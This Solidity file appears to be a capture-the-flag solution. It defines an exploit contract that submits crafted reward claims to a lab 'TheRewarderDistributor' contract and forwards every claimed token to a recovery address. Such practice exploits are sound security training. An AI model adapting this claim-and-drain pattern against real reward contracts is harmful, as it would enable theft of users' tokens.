// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TheRewarderDistributor, Claim} from "./TheRewarderDistributor.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract TheRewarderExploiter {
    using SafeTransferLib for address;

    TheRewarderDistributor private immutable distributor;
    address private immutable owner;

    constructor(TheRewarderDistributor _distributor) {
        distributor = _distributor;
        owner = msg.sender;
    }

    function attack(
        Claim[] memory claims,
        IERC20[] memory tokens,
        address recovery
    ) external {
        require(msg.sender == owner, "Unauthorized");

        // Claim rewards using provided claims and tokens
        distributor.claimRewards(claims, tokens);

        // Transfer all claimed tokens to recovery
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            uint256 balance = token.balanceOf(address(this));
            if (balance > 0) {
                token.transfer(recovery, balance);
            }
        }
    }
}
